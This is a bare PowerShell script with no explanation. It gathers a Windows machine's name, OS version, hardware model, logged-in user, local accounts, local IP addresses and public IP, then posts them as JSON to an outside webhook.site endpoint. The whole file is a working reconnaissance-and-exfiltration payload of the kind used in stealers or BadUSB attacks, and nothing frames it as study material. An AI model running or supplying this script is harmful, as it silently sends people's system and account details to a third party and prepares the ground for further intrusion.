$info = Get-ComputerInfo | select CsName, OsName, WindowsVersion, WindowsBuildLabEx, OsArchitecture, CsManufacturer, CsModel;
$user = gwmi Win32_ComputerSystem | select -exp UserName;
$localUsers = glu | select Name, Enabled;
$ipAddresses = Get-NetIPAddress | select InterfaceAlias, IPAddress;
$publicIP = (iwr "https://api64.ipify.org" -UseB).Content;

$data = @{
    ComputerInfo = $info
    UserName     = $user
    LocalUsers   = $localUsers
    IPAddresses  = $ipAddresses
    PublicIP     = $publicIP
} | ConvertTo-Json

iwr 'https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1' -Method Post -Body $data -ContentType "application/json";